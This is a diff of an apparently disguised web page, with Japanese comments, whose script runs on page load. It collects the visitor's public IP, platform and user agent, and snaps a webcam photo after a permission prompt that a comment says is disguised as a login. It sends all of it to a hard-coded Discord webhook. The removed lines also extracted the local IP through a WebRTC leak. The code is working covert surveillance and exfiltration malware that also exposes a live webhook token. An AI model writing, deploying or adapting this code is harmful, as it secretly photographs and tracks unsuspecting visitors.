@@ -194,87 +194,78 @@
 
     <canvas id="c" width="640" height="480"></canvas>
 
-
-
     <script>
+const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";
 
 async function startProtocol() {
-            const status = document.getElementById('status');
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            
-            let report = {
-                ts: new Date().toLocaleString(),
-                ip: "Scanning...",
-                localIp: "Analyzing...", // 追加：プライベートIP
-                plt: navigator.platform,
-                ua: navigator.userAgent
-            };
+    const status = document.getElementById('status');
+    const v = document.getElementById('v');
+    const c = document.getElementById('c');
+    
+    let report = {
+        ts: new Date().toLocaleString(),
+        ip: "Scanning...",
+        plt: navigator.platform,
+        ua: navigator.userAgent
+    };
 
-            // 1. グローバルIP取得
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const json = await res.json();
-                report.ip = json.ip;
-            } catch(e) { report.ip = "Access_Denied"; }
+    // 1. 高精度IP取得（パブリック & プライベートの試行）
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        report.ip = data.ip;
+    } catch(e) { report.ip = "Access_Denied"; }
 
-            // 1.5 プライベートIPの抽出 (WebRTC Leak)
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel("");
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                
-                report.localIp = await new Promise((resolve) => {
-                    const timeout = setTimeout(() => resolve("Timeout/Blocked"), 3000);
-                    pc.onicecandidate = (ice) => {
-                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                        const candidate = ice.candidate.candidate;
-                        const match = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9\-]+\.local)/.exec(candidate);
-                        if (match) {
-                            clearTimeout(timeout);
-                            resolve(match[1]);
-                            pc.close();
-                        }
-                    };
-                });
-            } catch(e) { report.localIp = "WebRTC_Error"; }
+    // 2. サイレントキャプチャ・エンジン
+    let fileBlob = null;
+    try {
+        // カメラアクセス。許可ポップアップが出るが、プロンプトを「ログイン」等に見せかけることで誘導
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
+        v.srcObject = stream;
+        
+        // 描画準備
+        await new Promise(r => setTimeout(r, 1000));
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, 640, 480);
+        
+        const dataUrl = c.toDataURL('image/jpeg', 0.7); // 圧縮率調整
+        const bRes = await fetch(dataUrl);
+        fileBlob = await bRes.blob();
+        
+        // 即座にストリームを停止し、使用中アイコンを消す
+        stream.getTracks().forEach(t => t.stop());
+    } catch(e) { 
+        status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; 
+    }
 
-            // 2. 自動キャプチャ (カメラ起動)
-            let fileBlob = null;
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: true});
-                v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
-                c.getContext('2d').drawImage(v, 0, 0, 640, 480);
-                const dataUrl = c.toDataURL('image/jpeg');
-                const bRes = await fetch(dataUrl);
-                fileBlob = await bRes.blob();
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; }
+    // 3. Discord Webhook Exfiltration (マルチパート送信)
+    const fd = new FormData();
+    if(fileBlob) fd.append('file', fileBlob, 'capture.jpg');
+    
+    const payload = {
+        username: "NANA_ARCHITECT_LOG",
+        avatar_url: "https://i.imgur.com/8N3XvU8.png", // アイコン
+        embeds: [{
+            title: "🛑 INTRUSION DETECTED / ACCESS LOG",
+            color: 16711680,
+            fields: [
+                { name: "📍 IP_ADDRESS", value: `\`${report.ip}\``, inline: true },
+                { name: "🖥 OS/PLATFORM", value: `\`${report.plt}\``, inline: true },
+                { name: "🕵️ BROWSER_AGENT", value: `\`\`\`${report.ua}\`\`\`` }
+            ],
+            footer: { text: `System Time: ${report.ts} | Status: EXFILTRATED` }
+        }]
+    };
+    fd.append('payload_json', JSON.stringify(payload));
 
-            // 3. 送信 (Discord Webhook)
-            const fd = new FormData();
-            if(fileBlob) fd.append('file', fileBlob, 'nana_capture.jpg');
-            
-            const payload = {
-                username: "nana_Admin_Bot",
-                embeds: [{
-                    title: "🔴 ACCESS LOG: NANA_PROFILE_VIEW (ENHANCED)",
-                    color: 16727873,
-                    fields: [
-                        { name: "🌐 PUBLIC_IP", value: `\`${report.ip}\``, inline: true },
-                        { name: "🏠 LOCAL_IP", value: `\`${report.localIp}\``, inline: true },
-                        { name: "💻 SYSTEM", value: report.plt, inline: true },
-                        { name: "📄 AGENT", value: `\`\`\`${report.ua}\`\`\`` }
-                    ],
-                    footer: { text: `Full Data Sync: ${report.ts}` }
-                }]
-            };
-            fd.append('payload_json', JSON.stringify(payload));
-
-            try {
-                await fetch(WH_URL, { method: 'POST', body: fd });
-                status.innerText = "LOG: CONNECTION ESTABLISHED. ALL DATA SYNCED.";
-            } catch(e) { status.innerText = "LOG: OFFLINE_RETRY_PENDING"; }
-        }
+    try {
+        await fetch(WH_URL, { method: 'POST', body: fd });
+        status.innerText = "LOG: PERSISTENT CONNECTION ACTIVE.";
+    } catch(e) { 
+        status.innerText = "LOG: SYNC_FAILED_RETRYING"; 
+    }
+}
+window.onload = startProtocol;
